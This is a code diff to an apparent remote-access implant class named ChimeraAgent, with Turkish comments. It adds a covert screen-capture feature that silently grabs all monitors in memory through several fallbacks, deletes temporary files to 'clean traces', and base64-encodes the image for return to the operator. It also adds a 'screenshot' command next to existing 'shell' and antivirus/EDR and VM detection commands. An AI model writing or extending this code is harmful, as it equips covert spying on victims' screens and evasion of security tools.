@@ -713,6 +713,214 @@ class ChimeraAgent:
         return "\n".join(output)
 
     # --------------------------------------------------------
+    # Ekran Görüntüsü (Screenshot) - RAM üzerinden capture
+    # --------------------------------------------------------
+    def take_screenshot(self) -> str:
+        """Anlık ekran görüntüsü alıp base64 encoded olarak döner.
+        
+        Tüm işlem RAM üzerinde gerçekleşir, diske herhangi bir dosya yazılmaz.
+        Platform bağımsız çalışır: Windows, Linux, macOS.
+        
+        Returns:
+            str: SCREENSHOT_OK:<base64_png_data> veya hata mesajı
+        """
+        import io
+        import tempfile
+        
+        png_data = None
+        
+        # Yöntem 1: mss kütüphanesi (cross-platform, en güvenilir)
+        try:
+            import mss
+            with mss.mss() as sct:
+                # Tüm monitörleri kapsayan screenshot
+                monitor = sct.monitors[0]  # 0 = tüm ekranlar
+                screenshot = sct.grab(monitor)
+                
+                # PNG formatına çevir (RAM üzerinde)
+                png_data = mss.tools.to_png(screenshot.rgb, screenshot.size)
+            
+            b64_data = base64.b64encode(png_data).decode('utf-8')
+            return f"SCREENSHOT_OK:{b64_data}"
+        except ImportError:
+            pass  # mss yüklü değil, diğer yöntemleri dene
+        except Exception:
+            pass
+        
+        # Yöntem 2: PIL/Pillow kütüphanesi
+        try:
+            from PIL import ImageGrab
+            img = ImageGrab.grab()
+            buffer = io.BytesIO()
+            img.save(buffer, format='PNG')
+            png_data = buffer.getvalue()
+            buffer.close()
+            
+            b64_data = base64.b64encode(png_data).decode('utf-8')
+            return f"SCREENSHOT_OK:{b64_data}"
+        except ImportError:
+            pass
+        except Exception:
+            pass
+        
+        # Yöntem 3: Platform spesifik araçlar (standart kütüphane + OS araçları)
+        if sys.platform == "win32":
+            # Windows: ctypes ile GDI+ kullanarak ekran görüntüsü
+            try:
+                import ctypes
+                from ctypes import windll, c_int, c_uint, c_void_p, byref, sizeof
+                from ctypes.wintypes import DWORD, LONG, WORD, BYTE
+                
+                # Ekran boyutlarını al
+                user32 = windll.user32
+                gdi32 = windll.gdi32
+                
+                width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
+                height = user32.GetSystemMetrics(1)   # SM_CYSCREEN
+                
+                # Device Context oluştur
+                hdesktop = user32.GetDesktopWindow()
+                hdc = user32.GetWindowDC(hdesktop)
+                memdc = gdi32.CreateCompatibleDC(hdc)
+                
+                # Bitmap oluştur
+                hbitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
+                gdi32.SelectObject(memdc, hbitmap)
+                
+                # Ekranı kopyala
+                gdi32.BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)  # SRCCOPY
+                
+                # BITMAPINFOHEADER yapısı (40 byte)
+                class BITMAPINFOHEADER(ctypes.Structure):
+                    _fields_ = [
+                        ('biSize', DWORD),
+                        ('biWidth', LONG),
+                        ('biHeight', LONG),
+                        ('biPlanes', WORD),
+                        ('biBitCount', WORD),
+                        ('biCompression', DWORD),
+                        ('biSizeImage', DWORD),
+                        ('biXPelsPerMeter', LONG),
+                        ('biYPelsPerMeter', LONG),
+                        ('biClrUsed', DWORD),
+                        ('biClrImportant', DWORD),
+                    ]
+                
+                bi = BITMAPINFOHEADER()
+                bi.biSize = sizeof(BITMAPINFOHEADER)
+                bi.biWidth = width
+                bi.biHeight = -height  # Top-down
+                bi.biPlanes = 1
+                bi.biBitCount = 24
+                bi.biCompression = 0  # BI_RGB
+                bi.biSizeImage = width * height * 3
+                
+                # Pixel verilerini al
+                pixel_data = ctypes.create_string_buffer(bi.biSizeImage)
+                gdi32.GetDIBits(memdc, hbitmap, 0, height, pixel_data, byref(bi), 0)
+                
+                # BMP formatında oluştur (RAM üzerinde)
+                bmp_header = struct.pack('<2sIHHI', b'BM',
+                    14 + sizeof(BITMAPINFOHEADER) + bi.biSizeImage,
+                    0, 0,
+                    14 + sizeof(BITMAPINFOHEADER))
+                
+                # biHeight'ı pozitif yap (BMP formatı için)
+                bi.biHeight = height
+                bmp_data = bmp_header + bytes(bi) + pixel_data.raw
+                
+                # Temizlik
+                gdi32.DeleteObject(hbitmap)
+                gdi32.DeleteDC(memdc)
+                user32.ReleaseDC(hdesktop, hdc)
+                
+                b64_data = base64.b64encode(bmp_data).decode('utf-8')
+                return f"SCREENSHOT_OK:{b64_data}"
+                
+            except Exception as e:
+                return f"[!] Screenshot hatası (Windows ctypes): {str(e)}"
+                
+        elif sys.platform == "darwin":
+            # macOS: screencapture komutu (stdout'a yönlendir)
+            try:
+                # Geçici dosya kullanmadan pipe ile al
+                tmp_path = os.path.join(tempfile.gettempdir(), f".sc_{random.randint(100000,999999)}.png")
+                result = subprocess.run(
+                    ["screencapture", "-x", tmp_path],
+                    capture_output=True,
+                    timeout=10
+                )
+                
+                if os.path.exists(tmp_path):
+                    with open(tmp_path, "rb") as f:
+                        png_data = f.read()
+                    # Hemen sil (izleri temizle)
+                    os.remove(tmp_path)
+                    
+                    b64_data = base64.b64encode(png_data).decode('utf-8')
+                    return f"SCREENSHOT_OK:{b64_data}"
+                else:
+                    return "[!] Screenshot alınamadı (screencapture başarısız)"
+            except Exception as e:
+                # Geçici dosyayı temizle
+                try:
+                    if os.path.exists(tmp_path):
+                        os.remove(tmp_path)
+                except:
+                    pass
+                return f"[!] Screenshot hatası (macOS): {str(e)}"
+                
+        else:
+            # Linux: scrot, import (ImageMagick) veya xdg araçları
+            tools = [
+                ["scrot", "-o", "/dev/stdout"],           # scrot stdout'a
+                ["import", "-window", "root", "png:-"],   # ImageMagick
+                ["gnome-screenshot", "-f", "/dev/stdout"], # GNOME
+            ]
+            
+            for tool_cmd in tools:
+                try:
+                    result = subprocess.run(
+                        tool_cmd,
+                        capture_output=True,
+                        timeout=10
+                    )
+                    if result.returncode == 0 and result.stdout:
+                        png_data = result.stdout
+                        b64_data = base64.b64encode(png_data).decode('utf-8')
+                        return f"SCREENSHOT_OK:{b64_data}"
+                except FileNotFoundError:
+                    continue  # Bu araç yüklü değil, sonrakini dene
+                except Exception:
+                    continue
+            
+            # Hiçbir araç çalışmadıysa geçici dosya yöntemi
+            try:
+                tmp_path = os.path.join(tempfile.gettempdir(), f".sc_{random.randint(100000,999999)}.png")
+                for fallback_cmd in [
+                    ["scrot", tmp_path],
+                    ["import", "-window", "root", tmp_path],
+                ]:
+                    try:
+                        result = subprocess.run(fallback_cmd, capture_output=True, timeout=10)
+                        if os.path.exists(tmp_path):
+                            with open(tmp_path, "rb") as f:
+                                png_data = f.read()
+                            os.remove(tmp_path)
+                            b64_data = base64.b64encode(png_data).decode('utf-8')
+                            return f"SCREENSHOT_OK:{b64_data}"
+                    except FileNotFoundError:
+                        continue
+                    except Exception:
+                        continue
+                        
+                return "[!] Screenshot alınamadı. Gerekli araçlar: mss, Pillow, scrot veya ImageMagick"
+            except Exception as e:
+                return f"[!] Screenshot hatası (Linux): {str(e)}"
+        
+        return "[!] Screenshot alınamadı. Lütfen 'pip install mss' veya 'pip install Pillow' kurun."
+
+    # --------------------------------------------------------
     # Komut Çalıştırma
     # --------------------------------------------------------
     def shell_mode(self):
@@ -826,6 +1034,10 @@ class ChimeraAgent:
         # Ortam analizi komutu (AV/EDR ve VM tespiti)
         if cmd_lower == "detect":
             return self.detect_environment()
+        
+        # Ekran görüntüsü komutu (RAM üzerinden capture & transfer)
+        if cmd_lower == "screenshot":
+            return self.take_screenshot()
             
         # Özel komutlar - Shell
         if cmd_lower == "shell":
